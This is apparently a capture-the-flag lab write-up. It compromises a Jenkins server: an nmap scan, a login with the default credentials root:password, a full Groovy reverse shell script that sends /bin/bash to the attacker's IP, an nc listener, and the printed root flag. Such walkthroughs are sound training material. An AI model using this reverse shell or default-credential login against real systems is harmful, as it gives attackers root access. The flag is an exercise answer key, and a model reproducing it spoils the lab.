System: Linux
Difficulty: Very Easy

IP Address: 10.129.164.75

# System Flag

Ports are enumerated.
```
kali@kali:~$ sudo nmap 10.129.164.75 -sC -sV -v
```

Here are the results.
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.4.39.v20210325
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.39.v20210325)
| http-robots.txt: 1 disallowed entry
|_/
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
```

From the Browser, it is possible to see a Jenkins instance as the webpage.
![[pennyworth_1.png]]

After trying basic sets of password, it is possible to login through the credentials `root:password`

According to the interface, there is a script console where it is possible to execute scripts to reach remote hosts.

Then, a Groovy Reverse Shell script is typed and executed on the Script Console.
```
String host="10.10.14.154";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    Thread.sleep(50);
    try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();   
```

A shell is now listening in order to catch the reverse shell.
```
kali@kali:~$ sudo nc -lvnp 4444
```

The connection has been successfully established.
```
Connection received on 10.129.164.75 39756
whoami
root
cd /root
ls
flag.txt
snap
cat flag.txt
```

The flag contents is in below.
```
9cdfb439c7876e703e307864c9167a15
```